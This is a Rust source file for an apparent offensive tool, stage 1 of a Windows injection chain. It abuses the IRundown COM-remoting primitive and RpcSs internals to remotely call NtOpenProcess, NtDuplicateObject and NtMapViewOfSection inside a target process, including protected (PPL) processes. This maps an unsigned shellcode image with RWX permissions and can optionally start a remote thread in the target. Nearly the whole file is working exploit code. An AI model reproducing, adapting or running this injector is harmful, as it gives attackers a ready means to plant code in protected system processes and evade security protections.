//! `pplsystem.exe` - maps an unsigned PE image into a target process.
//!
//! Stage 1 of the chain: uses the IRundown COM-remoting primitive to remotely
//! call `NtOpenProcess` -> `NtDuplicateObject` -> `NtMapViewOfSection` inside the
//! target, mapping `--shellcode` as a `SEC_IMAGE` section. It then reads the
//! mapped base back out of the target and prints it as `mapped-base: 0x...` so
//! the orchestrator can hand it to `shellcode.exe` (stage 2) without a second
//! memory dump.

use anyhow::{anyhow, Context, Result};
use clap::{Parser, ValueEnum};
use pplsystem_core::{
    irundown::{
        inject::{
            call_ndr_server_call2, increment_and_read, init_remote_com_secret,
            overwrite_data_to_address, set_call_args, write_data_to_address, write_rpc_message,
        },
        locate::{read_secret_and_context_from_dump, read_secret_and_context_remote},
        rpcss::{locate_rpcss_oxid_list_head, CProcess, CServerOXID},
    },
    pe::system_dll_data_section,
};
use std::ffi::CString;
use std::mem::transmute_copy;
use std::{
    fs,
    mem::size_of,
    os::raw::c_void,
    process,
    time::{SystemTime, UNIX_EPOCH},
};
use sysinfo::System;
use windows::{
    core::{s, GUID, PCSTR},
    Wdk::{
        Foundation::OBJECT_ATTRIBUTES,
        Storage::FileSystem::NtCreateSection,
        System::SystemServices::{ViewShare, PAGE_EXECUTE_READWRITE, PAGE_READONLY},
    },
    Win32::{
        Foundation::{CloseHandle, GENERIC_ALL, GENERIC_READ, HANDLE, LUID},
        Security::{
            AdjustTokenPrivileges, LookupPrivilegeValueA, LUID_AND_ATTRIBUTES,
            SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES,
        },
        Storage::FileSystem::{CreateFileA, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, OPEN_EXISTING},
        System::{
            Com::{CoInitializeEx, COINIT_MULTITHREADED},
            Diagnostics::Debug::ReadProcessMemory,
            LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
            Memory::{SECTION_ALL_ACCESS, SEC_IMAGE},
            Threading::{GetCurrentProcess, OpenProcess, OpenProcessToken, PROCESS_ALL_ACCESS},
        },
    },
};

#[derive(Copy, Clone, Debug, PartialEq, Eq, ValueEnum)]
enum TargetMode {
    /// Read the COM secret/context directly from a normal (non-PPL) target.
    Regedit,
    /// Take the COM secret/context on the command line (extracted from a PPL dump).
    Ppl,
}

#[derive(Parser, Debug)]
#[command(version, about = "Map an unsigned PE image into a target via IRundown", long_about = None)]
struct Args {
    /// Target mode.
    #[arg(long, value_enum, default_value_t = TargetMode::Regedit)]
    target: TargetMode,

    /// Path of the shellcode / PE image to map (required unless --dry-run).
    #[arg(long)]
    shellcode: Option<String>,

    /// Target PID. Optional in regedit mode (auto-discovers regedit.exe).
    #[arg(long)]
    pid: Option<u32>,

    /// PPL mode: full-memory user dump to read the COM secret/context from
    /// (no debugger needed).
    #[arg(long)]
    dump: Option<String>,

    /// Resolve and print the COM secret/context, then exit without injecting.
    #[arg(long)]
    dry_run: bool,

    /// COM secret override (hex u128) - bypasses --dump in ppl mode.
    #[arg(long)]
    com_secret: Option<String>,

    /// COM context override (hex u64) - bypasses --dump in ppl mode.
    #[arg(long)]
    com_context: Option<String>,

    /// Also protect the first page and create the remote thread in THIS process
    /// (one warmed-up COM session), rather than leaving it to shellcode.exe.
    #[arg(long)]
    execute: bool,

    /// With --execute: start the thread at the image base (offset 0), for pe2shc
    /// shellcode whose redirect lives in the PE header, instead of the entry point.
    #[arg(long)]
    from_base: bool,
}

fn parse_hex_u128(s: &str) -> Result<u128, std::num::ParseIntError> {
    let s = s.trim_start_matches("0x").trim_start_matches("0X");
    u128::from_str_radix(s, 16)
}

fn parse_hex_u64(s: &str) -> Result<u64, std::num::ParseIntError> {
    let s = s.trim_start_matches("0x").trim_start_matches("0X");
    u64::from_str_radix(s, 16)
}

fn enable_debug_privilege() -> Result<()> {
    unsafe {
        let mut token_handle = HANDLE::default();

        OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES,
            &mut token_handle,
        )
        .context("OpenProcessToken failed")?;

        let mut luid = LUID::default();
        LookupPrivilegeValueA(PCSTR::null(), s!("SeDebugPrivilege"), &mut luid)
            .context("LookupPrivilegeValue(SeDebugPrivilege) failed")?;

        let tp = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [LUID_AND_ATTRIBUTES {
                Luid: luid,
                Attributes: SE_PRIVILEGE_ENABLED,
            }],
        };

        AdjustTokenPrivileges(token_handle, false, Some(&tp), 0, None, None)
            .context("AdjustTokenPrivileges(SeDebugPrivilege) failed - run as Administrator")?;

        println!("[+] SeDebugPrivilege enabled");
        Ok(())
    }
}

fn find_rpcss_svchost_pid() -> Result<u32> {
    let mut system = System::new_all();
    system.refresh_processes();

    for (pid, process) in system.processes() {
        if process.name().eq_ignore_ascii_case("svchost.exe") {
            let cmdline = process.cmd().join(" ");
            if cmdline.to_ascii_uppercase().contains("RPCSS") {
                let pid_u32 = pid.as_u32();
                println!("[+] RpcSs svchost PID: {}", pid_u32);
                return Ok(pid_u32);
            }
        }
    }

    Err(anyhow!(
        "could not find the svchost.exe hosting RpcSs (run elevated)"
    ))
}

/// Ensure the system DLLs we later resolve with `GetModuleHandleA` are mapped.
/// `LoadLibraryA` of an already-loaded module just bumps its refcount, so this
/// is a cheap, idempotent guard against an "module not loaded" panic.
fn ensure_modules_loaded() {
    for dll in [
        "rpcrt4.dll\0",
        "kernel32.dll\0",
        "ntdll.dll\0",
        "combase.dll\0",
        "shell32.dll\0",
        "win32u.dll\0",
        "bcryptprimitives.dll\0",
    ] {
        unsafe {
            let _ = LoadLibraryA(PCSTR(dll.as_ptr()));
        }
    }
}

fn find_process_pid_by_name(name: &str) -> Option<u32> {
    let mut system = System::new_all();
    system.refresh_processes();
    for (pid, process) in system.processes() {
        if process.name().eq_ignore_ascii_case(name) {
            return Some(pid.as_u32());
        }
    }
    None
}

fn resolve_target_pid(args: &Args) -> Result<u32> {
    if let Some(pid) = args.pid {
        if pid == 0 {
            return Err(anyhow!("--pid must be non-zero"));
        }
        return Ok(pid);
    }

    match args.target {
        TargetMode::Regedit => find_process_pid_by_name("regedit.exe")
            .ok_or_else(|| anyhow!("regedit.exe is not running - launch it first or pass --pid")),
        TargetMode::Ppl => Err(anyhow!("--pid is required in ppl mode")),
    }
}

fn resolve_secret_context(args: &Args, target_pid: u32) -> Result<(u128, u64)> {
    match args.target {
        TargetMode::Regedit => read_secret_and_context_remote(target_pid)
            .context("failed reading COM secret/context from the target (regedit mode)"),
        TargetMode::Ppl => {
            // Explicit hex overrides win; otherwise read straight out of the dump.
            if let (Some(s), Some(c)) = (args.com_secret.as_deref(), args.com_context.as_deref()) {
                let secret = parse_hex_u128(s)
                    .map_err(|e| anyhow!("invalid --com-secret (expected hex u128): {e}"))?;
                let context = parse_hex_u64(c)
                    .map_err(|e| anyhow!("invalid --com-context (expected hex u64): {e}"))?;
                Ok((secret, context))
            } else if let Some(dump) = args.dump.as_deref() {
                read_secret_and_context_from_dump(dump)
                    .context("failed reading COM secret/context from the dump (ppl mode)")
            } else {
                Err(anyhow!(
                    "ppl mode requires --dump <user.dmp> (or explicit --com-secret/--com-context)"
                ))
            }
        }
    }
}

fn main() -> Result<()> {
    let args = Args::parse();

    enable_debug_privilege().context("could not enable SeDebugPrivilege")?;

    // Needed for the IMarshalEnvoy resolution path inside read_secret_and_context_remote
    // and for the OXID scan. Tolerate an already-initialised apartment / changed mode.
    let _ = unsafe { CoInitializeEx(None, COINIT_MULTITHREADED) };

    ensure_modules_loaded();

    let target_pid = resolve_target_pid(&args)?;
    println!("[+] Target PID: {target_pid}");

    let (com_secret, com_context) = resolve_secret_context(&args, target_pid)?;
    println!("[+] COM secret : {:#X}", com_secret);
    println!("[+] COM context: {:#X}", com_context);

    if args.dry_run {
        println!("[+] Dry run complete (resolved secret/context only; no injection).");
        return Ok(());
    }

    let shellcode_path = args
        .shellcode
        .as_deref()
        .ok_or_else(|| anyhow!("--shellcode is required (omit only with --dry-run)"))?;

    let rpcss_pid = find_rpcss_svchost_pid()?;

    let shellcode_bytes = fs::read(shellcode_path)
        .with_context(|| format!("failed reading shellcode '{shellcode_path}'"))?;
    println!("[+] Shellcode size: {} bytes", shellcode_bytes.len());

    let rpcss_handle = unsafe {
        OpenProcess(PROCESS_ALL_ACCESS, false, rpcss_pid)
            .with_context(|| format!("OpenProcess(RpcSs pid {rpcss_pid}) failed"))?
    };

    let oxid_list_head = locate_rpcss_oxid_list_head().ok_or_else(|| {
        anyhow!("failed locating the RpcSs OXID list head (PDB download / symbol lookup failed)")
    })?;

    let mut server_oxid_list_head: u64 = 0;
    unsafe {
        ReadProcessMemory(
            rpcss_handle,
            oxid_list_head.addr as *const c_void,
            &mut server_oxid_list_head as *mut u64 as *mut c_void,
            8,
            None,
        )
        .context("reading gpServerOxidTable head failed")?;
    }
    println!("[+] OID server list addr: {:#X}", server_oxid_list_head);

    let mut number_of_oxid_entries: u32 = 0;
    unsafe {
        ReadProcessMemory(
            rpcss_handle,
            server_oxid_list_head as *const c_void,
            &mut number_of_oxid_entries as *mut u32 as *mut c_void,
            4,
            None,
        )
        .context("reading OXID entry count failed")?;
    }
    println!("[+] Number of entries: {:#X}", number_of_oxid_entries);

    let mut oxid_array_address: u64 = 0;
    unsafe {
        ReadProcessMemory(
            rpcss_handle,
            (server_oxid_list_head + 8) as *const c_void,
            &mut oxid_array_address as *mut u64 as *mut c_void,
            8,
            None,
        )
        .context("reading OXID array address failed")?;
    }
    println!("[+] OXID array @ {:#X}", oxid_array_address);

    let mut oxid_array_data: Vec<u8> = vec![0; (number_of_oxid_entries * 8) as usize];
    unsafe {
        ReadProcessMemory(
            rpcss_handle,
            oxid_array_address as *const c_void,
            oxid_array_data.as_mut_ptr() as *mut c_void,
            (number_of_oxid_entries * 8) as usize,
            None,
        )
        .context("reading OXID array failed")?;
    }

    let (_prefix, oxid_array_data, _suffix) = unsafe { oxid_array_data.align_to::<u64>() };

    let mut target_oxid = 0;
    let mut target_ipid = 0;

    for &oxid_entry_address in oxid_array_data {
        if oxid_entry_address == 0 {
            continue;
        }

        let mut cserver_oxid_entry = CServerOXID {
            padding: [0; 0x18],
            oxid: 0,
            cprocess: 0,
            padding2: [0; 0x38],
            ipid: 0,
        };

        unsafe {
            ReadProcessMemory(
                rpcss_handle,
                oxid_entry_address as *const c_void,
                &mut cserver_oxid_entry as *mut CServerOXID as *mut c_void,
                size_of::<CServerOXID>(),
                None,
            )
            .context("reading CServerOXID entry failed")?;
        }

        let mut cprocess_entry = CProcess {
            pid: 0,
            padding: [0; 88],
        };

        unsafe {
            ReadProcessMemory(
                rpcss_handle,
                cserver_oxid_entry.cprocess as *const c_void,
                &mut cprocess_entry as *mut CProcess as *mut c_void,
                size_of::<CProcess>(),
                None,
            )
            .context("reading CProcess entry failed")?;
        }

        if cprocess_entry.pid == target_pid {
            println!("[+] Found PID  : {:#?}", cprocess_entry.pid);
            println!("[+] Found OXID : {:#X?}", cserver_oxid_entry.oxid);
            println!(
                "[+] Found IPID : {:#X?}",
                GUID::from_u128(u128::from_be(cserver_oxid_entry.ipid))
            );

            target_ipid = cserver_oxid_entry.ipid;
            target_oxid = cserver_oxid_entry.oxid;

            let result = init_remote_com_secret(target_ipid, target_oxid);
            if result.is_err() && result.0 as u32 == 0x80070057 {
                break;
            }
        }
    }

    if target_ipid == 0 || target_oxid == 0 {
        return Err(anyhow!(
            "failed finding IPID/OXID for IRundown in target pid {target_pid} - the process has most likely not initialised COM"
        ));
    }

    // ---- Stage A: NtOpenProcess(self) inside the target -------------------
    let rpcrt_data = system_dll_data_section("rpcrt4.dll")?;
    let kernel32_data = system_dll_data_section("kernel32.dll")?;
    let shell32_data = system_dll_data_section("shell32.dll")?;
    let win32u_data = system_dll_data_section("win32u.dll")?;
    let bcryptprimitives_data = system_dll_data_section("bcryptprimitives.dll")?;

    if ((rpcrt_data.virtual_size & 0xFFF) + 0x220) >= 0x1000 {
        return Err(anyhow!(
            "rpcrt4.dll .data section is too small; use another DLL"
        ));
    }

    let start_address1 = unsafe { GetModuleHandleA(s!("rpcrt4\0")).unwrap().0 as u64 }
        + rpcrt_data.virtual_address as u64
        + rpcrt_data.virtual_size as u64;

    let arguments_address = unsafe {
        GetModuleHandleA(s!("kernel32.dll\0")).unwrap().0 as u64
            + kernel32_data.virtual_address as u64
            + ((kernel32_data.virtual_size + 8 - 1) & 0xFFF8) as u64
    };

    let target_function = unsafe {
        GetProcAddress(
            GetModuleHandleA(s!("ntdll.dll\0")).unwrap(),
            s!("NtOpenProcess"),
        )
        .unwrap() as u64
    };

    let message_addr = write_rpc_message(
        start_address1,
        arguments_address,
        target_function,
        target_ipid,
        target_oxid,
        com_context,
        com_secret,
    );

    let handle_to_self_rs_address =
        unsafe { GetModuleHandleA(s!("shell32.dll\0")).unwrap().0 as u64 }
            + shell32_data.virtual_address as u64
            + shell32_data.virtual_size as u64;

    let remote_handle_to_section_address = handle_to_self_rs_address + 8;

    let mut obj_attr = OBJECT_ATTRIBUTES::default();
    obj_attr.Length = size_of::<OBJECT_ATTRIBUTES>() as u32;
    let obj_data: [u8; size_of::<OBJECT_ATTRIBUTES>()] = unsafe { transmute_copy(&obj_attr) };

    write_data_to_address(
        &obj_data,
        remote_handle_to_section_address + 8,
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    );

    // CLIENT_ID { UniqueProcess = our pid, UniqueThread = 0 }
    let pid_qword: u64 = process::id() as u64;
    let mut cid_buf = [0u8; 16];
    cid_buf[0..8].copy_from_slice(&pid_qword.to_ne_bytes());
    // (upper 8 bytes already zero)

    write_data_to_address(
        &cid_buf,
        remote_handle_to_section_address + 8 + size_of::<OBJECT_ATTRIBUTES>() as u64,
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    );

    set_call_args(
        [
            handle_to_self_rs_address,
            PROCESS_ALL_ACCESS.0 as u64,
            remote_handle_to_section_address + 8,
            remote_handle_to_section_address + 8 + size_of::<OBJECT_ATTRIBUTES>() as u64,
            0x4,
            0x5,
            0x6,
            0x7,
            0x8,
            0x9,
            0xA,
            0xB,
            0xC,
            0xD,
        ],
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    );

    call_ndr_server_call2(
        message_addr,
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    );

    // ---- Stage B: NtDuplicateObject(section handle -> target) -------------
    if ((bcryptprimitives_data.virtual_size & 0xFFF) + 0x220) >= 0x1000 {
        return Err(anyhow!(
            "bcryptprimitives.dll .data section is too small; use another DLL"
        ));
    }

    let start_address2 =
        unsafe { GetModuleHandleA(s!("bcryptprimitives.dll\0")).unwrap().0 as u64 }
            + bcryptprimitives_data.virtual_address as u64
            + bcryptprimitives_data.virtual_size as u64;

    let arguments_address2 = unsafe {
        GetModuleHandleA(s!("kernel32.dll\0")).unwrap().0 as u64
            + kernel32_data.virtual_address as u64
            + ((kernel32_data.virtual_size + 8 - 1) & 0xFFF8) as u64
    };

    let target_function2 = unsafe {
        GetProcAddress(
            GetModuleHandleA(s!("ntdll.dll\0")).unwrap(),
            s!("NtDuplicateObject"),
        )
        .unwrap() as u64
    };

    let message_addr2 = write_rpc_message(
        start_address2,
        arguments_address2,
        target_function2,
        target_ipid,
        target_oxid,
        com_context,
        com_secret,
    );

    let handle_to_rs = increment_and_read(
        handle_to_self_rs_address,
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    )
    .wrapping_sub(1);

    println!("[+] Remote HANDLE to our process: {:#X}", handle_to_rs);

    // Create a SEC_IMAGE section backed by a per-run temp file. Windows can keep
    // an image-section backing file busy while a mapped view exists, so retries
    // must not try to overwrite a fixed temp filename.
    let temp_suffix = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|duration| duration.as_nanos())
        .unwrap_or_default();
    let temp_file_path = std::env::temp_dir().join(format!(
        "pplsystem_shellcode_{}_{}_{}.bin",
        process::id(),
        target_pid,
        temp_suffix
    ));
    fs::write(&temp_file_path, &shellcode_bytes).context("failed writing shellcode temp file")?;

    let temp_file_c = CString::new(temp_file_path.to_string_lossy().as_bytes())
        .context("shellcode temp path contains a NUL byte")?;
    let shellcode_handle = unsafe {
        CreateFileA(
            PCSTR(temp_file_c.as_ptr() as *const u8),
            GENERIC_READ.0,
            FILE_SHARE_READ,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None,
        )
        .context("CreateFileA(shellcode temp) failed")?
    };

    let mut section_handle = HANDLE::default();
    let status = unsafe {
        NtCreateSection(
            &mut section_handle,
            SECTION_ALL_ACCESS.0,
            None,
            None,
            PAGE_READONLY,
            SEC_IMAGE.0,
            shellcode_handle,
        )
    };
    let _ = unsafe { CloseHandle(shellcode_handle) };
    if status.is_err() {
        let _ = fs::remove_file(&temp_file_path);
        return Err(anyhow!("NtCreateSection(SEC_IMAGE) failed: {:?}", status));
    }
    println!("[+] Created shellcode SEC_IMAGE section");

    set_call_args(
        [
            handle_to_rs,
            section_handle.0 as u64,
            u64::MAX,
            remote_handle_to_section_address,
            GENERIC_ALL.0 as u64,
            0,
            0x0,
            0x7,
            0x8,
            0x9,
            0xA,
            0xB,
            0xC,
            0xD,
        ],
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    );

    call_ndr_server_call2(
        message_addr2,
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    );
    let _ = unsafe { CloseHandle(section_handle) };

    let remote_handle_to_section = increment_and_read(
        remote_handle_to_section_address,
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    )
    .wrapping_sub(1);

    println!(
        "[+] Remote HANDLE to shellcode section: {:#X}",
        remote_handle_to_section
    );

    // ---- Stage C: NtMapViewOfSection inside the target --------------------
    if ((win32u_data.virtual_size & 0xFFF) + 0x220) >= 0x1000 {
        return Err(anyhow!(
            "win32u.dll .data section is too small; use another DLL"
        ));
    }

    let start_address3 = unsafe { GetModuleHandleA(s!("win32u.dll\0")).unwrap().0 as u64 }
        + win32u_data.virtual_address as u64
        + win32u_data.virtual_size as u64;

    let arguments_address3 = unsafe {
        GetModuleHandleA(s!("kernel32.dll\0")).unwrap().0 as u64
            + kernel32_data.virtual_address as u64
            + ((kernel32_data.virtual_size + 8 - 1) & 0xFFF8) as u64
    };

    let target_function3 = unsafe {
        GetProcAddress(
            GetModuleHandleA(s!("ntdll.dll\0")).unwrap(),
            s!("NtMapViewOfSection"),
        )
        .unwrap() as u64
    };

    let message_addr3 = write_rpc_message(
        start_address3,
        arguments_address3,
        target_function3,
        target_ipid,
        target_oxid,
        com_context,
        com_secret,
    );

    set_call_args(
        [
            remote_handle_to_section,       // SECTION HANDLE
            u64::MAX,                       // PROCESS HANDLE (current = -1)
            arguments_address3 + 0x200,     // PVOID* BaseAddress (out)
            0,                              // ZeroBits
            0,                              // CommitSize
            0,                              // SectionOffset
            arguments_address3 + 0x200 + 8, // ViewSize (out)
            ViewShare.0 as u64,             // InheritDisposition
            0x0,                            // AllocationType
            PAGE_EXECUTE_READWRITE as u64,  // Win32Protect
            0xA,
            0xB,
            0xC,
            0xD,
        ],
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    );

    // Zero the BaseAddress + ViewSize out-params first (clear any stale scratch),
    // then write the PE's PREFERRED ImageBase as the BaseAddress hint. Mapping a
    // SEC_IMAGE at its preferred base means the kernel applies NO relocation; a
    // kernel-relocated SEC_IMAGE at an ASLR'd base produces a degenerate
    // (NOACCESS) remote view (verified: even the mapping process can't read it).
    // The pe2shc loader stub fixes imports and any residual relocation itself, so
    // a clean unrelocated map at the preferred base is exactly what we want. The
    // target's own image is ASLR'd elsewhere, so the preferred base is free.
    overwrite_data_to_address(
        &[0u8; 16],
        arguments_address3 + 0x200,
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    );
    let preferred_base = pe_image_base(&shellcode_bytes).unwrap_or(0);
    if preferred_base != 0 {
        write_data_to_address(
            &preferred_base.to_le_bytes(),
            arguments_address3 + 0x200,
            target_ipid,
            target_oxid,
            com_secret,
            com_context,
        );
        println!(
            "[+] Requesting map at preferred ImageBase {:#X} (no kernel relocation)",
            preferred_base
        );
    }

    call_ndr_server_call2(
        message_addr3,
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    );

    // Read the 64-bit mapped base out of the out-param (arguments_address3+0x200).
    // CRITICAL: the read primitive (CStdStubBuffer_AddRef) returns its result in
    // EAX - only 32 bits - so a single read truncates a 64-bit address (e.g. it
    // turns 0x140000000 into 0x40000000). Read the low and high dwords separately
    // and recombine.
    let base_low = increment_and_read(
        arguments_address3 + 0x200,
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    )
    .wrapping_sub(1)
        & 0xFFFF_FFFF;
    let base_high = increment_and_read(
        arguments_address3 + 0x204,
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    )
    .wrapping_sub(1)
        & 0xFFFF_FFFF;
    let mapped_base = (base_high << 32) | base_low;

    // Read the ViewSize out-param too: NtMapViewOfSection only writes it on
    // success, so ViewSize==0 means the call FAILED (and `mapped_base` is just our
    // stale hint), whereas a non-zero ViewSize ~ SizeOfImage means it really
    // mapped and any unreadability is a property of the resulting view.
    let view_size = increment_and_read(
        arguments_address3 + 0x208,
        target_ipid,
        target_oxid,
        com_secret,
        com_context,
    )
    .wrapping_sub(1)
        & 0xFFFF_FFFF;
    println!(
        "[*] NtMapViewOfSection ViewSize = {:#X} (0 => the map call FAILED)",
        view_size
    );

    // NOTE: do NOT delete the temp file here. A SEC_IMAGE view is demand-paged
    // from its backing file - deleting the backing makes every not-yet-resident
    // page fault (NOACCESS), which is exactly what made the remote map look
    // "degenerate". The file must outlive the mapping (i.e. until the injected
    // payload has run), so it is left in %TEMP% for later cleanup.
    println!("[i] Section backing file (keep until payload runs): {}", temp_file_path.display());

    // A valid user-mode image base is non-zero and page-aligned. If it is not,
    // the remote NtMapViewOfSection never ran (the value is a sign-extended error
    // HRESULT) - the target's IRundown is not serviceable. Fail clearly instead
    // of emitting a bogus base that stage 2 would reject.
    if mapped_base == 0 || (mapped_base & 0xFFF) != 0 || mapped_base > 0x7FFF_FFFF_FFFF {
        return Err(anyhow!(
            "NtMapViewOfSection returned no valid mapped base ({:#X}); the target's IRundown is not serviceable (its COM is likely degraded - use a fresh target instance or the test target)",
            mapped_base
        ));
    }

    // ---- Optional: protect the first page + create the remote thread, all in
    // THIS warmed-up COM session (more reliable than re-establishing it in a cold
    // second process - shellcode.exe's NtProtect intermittently no-ops there).
    //
    // A SEC_IMAGE maps the PE-headers page (where pe2shc's redirect lives)
    // PAGE_READONLY (non-executable), while every section is already mapped
    // executable (PAGE_EXECUTE_WRITECOPY, because shellcode_editor.py marked them
    // RWX). So only the FIRST PAGE must be made executable; NtProtect over the
    // whole image spans the RO-headers and WRITECOPY-section regions and fails.
    if args.execute {
        let entry_rva = pe_entry_point(&shellcode_bytes).unwrap_or(0) as u64;
        let thread_start = if args.from_base {
            mapped_base
        } else {
            mapped_base + entry_rva
        };

        let ntdll_data = system_dll_data_section("ntdll.dll")?;
        let advapi32_data = system_dll_data_section("advapi32.dll")?;
        let user32_data = system_dll_data_section("user32.dll")?;

        // Scratch slots in ntdll!.data: [thread handle][old protect][base][region].
        let thread_handle_address = unsafe {
            GetModuleHandleA(s!("ntdll.dll\0")).unwrap().0 as u64
                + ntdll_data.virtual_address as u64
                + ntdll_data.virtual_size as u64
        };
        let old_protect_address = thread_handle_address + 8;
        let base_addr_slot = old_protect_address + 8;
        let region_slot = base_addr_slot + 8;

        // NtProtectVirtualMemory(first page -> RWX).
        let prot_start = unsafe { GetModuleHandleA(s!("ADVAPI32.dll\0")).unwrap().0 as u64 }
            + advapi32_data.virtual_address as u64
            + advapi32_data.virtual_size as u64;
        let nt_protect = unsafe {
            GetProcAddress(
                GetModuleHandleA(s!("ntdll.dll\0")).unwrap(),
                s!("NtProtectVirtualMemory"),
            )
            .unwrap() as u64
        };
        write_data_to_address(&mapped_base.to_le_bytes(), base_addr_slot, target_ipid, target_oxid, com_secret, com_context);
        let first_page: u64 = 0x1000;
        write_data_to_address(&first_page.to_le_bytes(), region_slot, target_ipid, target_oxid, com_secret, com_context);
        let prot_msg = write_rpc_message(prot_start, arguments_address3, nt_protect, target_ipid, target_oxid, com_context, com_secret);
        set_call_args(
            [u64::MAX, base_addr_slot, region_slot, 0x40, old_protect_address, 0, 0, 0, 0, 0, 0, 0xB, 0xC, 0xD],
            target_ipid, target_oxid, com_secret, com_context,
        );
        overwrite_data_to_address(&[0u8; 8], old_protect_address, target_ipid, target_oxid, com_secret, com_context);
        call_ndr_server_call2(prot_msg, target_ipid, target_oxid, com_secret, com_context);
        let old_protect = increment_and_read(old_protect_address, target_ipid, target_oxid, com_secret, com_context).wrapping_sub(1);
        println!(
            "[+] NtProtectVirtualMemory(first page @ {:#X}) OldProtect = {:#X}",
            mapped_base,
            old_protect & 0xFFFF_FFFF
        );
        if (old_protect & 0xFFFF_FFFF) == 0 {
            return Err(anyhow!(
                "NtProtectVirtualMemory(first page) failed (OldProtect=0); refusing to create a thread"
            ));
        }

        // NtCreateThreadEx(StartAddress = thread_start).
        let start_address = unsafe { GetModuleHandleA(s!("user32\0")).unwrap().0 as u64 }
            + user32_data.virtual_address as u64
            + user32_data.virtual_size as u64;
        let nt_create_thread = unsafe {
            GetProcAddress(
                GetModuleHandleA(s!("ntdll.dll\0")).unwrap(),
                s!("NtCreateThreadEx"),
            )
            .unwrap() as u64
        };
        let thread_msg = write_rpc_message(start_address, arguments_address3, nt_create_thread, target_ipid, target_oxid, com_context, com_secret);
        println!(
            "[+] Creating remote thread at {:#X} ({})",
            thread_start,
            if args.from_base { "image base / pe2shc redirect" } else { "entry point" }
        );
        set_call_args(
            [thread_handle_address, 0x1FFFFF, 0, u64::MAX, thread_start, 0, 0, 0, 0, 0, 0, 0xB, 0xC, 0xD],
            target_ipid, target_oxid, com_secret, com_context,
        );
        overwrite_data_to_address(&[0u8; 8], thread_handle_address, target_ipid, target_oxid, com_secret, com_context);
        call_ndr_server_call2(thread_msg, target_ipid, target_oxid, com_secret, com_context);
        let thread_handle = increment_and_read(thread_handle_address, target_ipid, target_oxid, com_secret, com_context).wrapping_sub(1);
        if thread_handle == 0 {
            println!("[!] Remote thread handle = 0 -> NtCreateThreadEx FAILED");
        } else {
            println!("[+] Remote thread created (handle {:#X})", thread_handle);
        }
    }

    // Machine-readable line the orchestrator greps for.
    println!("mapped-base: {:#018X}", mapped_base);
    println!("[+] Mapped shellcode image base: {:#X}", mapped_base);
    println!("[+] Done!");
    Ok(())
}

/// Read the preferred `ImageBase` from a PE32+ optional header.
fn pe_image_base(bytes: &[u8]) -> Option<u64> {
    if bytes.len() < 0x40 {
        return None;
    }
    let e_lfanew = u32::from_le_bytes(bytes[0x3C..0x40].try_into().ok()?) as usize;
    let opt = e_lfanew + 0x18;
    if bytes.len() < opt + 0x20 {
        return None;
    }
    Some(u64::from_le_bytes(bytes[opt + 0x18..opt + 0x20].try_into().ok()?))
}

/// Read `AddressOfEntryPoint` from a PE32+ optional header.
fn pe_entry_point(bytes: &[u8]) -> Option<u32> {
    if bytes.len() < 0x40 {
        return None;
    }
    let e_lfanew = u32::from_le_bytes(bytes[0x3C..0x40].try_into().ok()?) as usize;
    let opt = e_lfanew + 0x18;
    if bytes.len() < opt + 0x14 {
        return None;
    }
    Some(u32::from_le_bytes(bytes[opt + 0x10..opt + 0x14].try_into().ok()?))
}
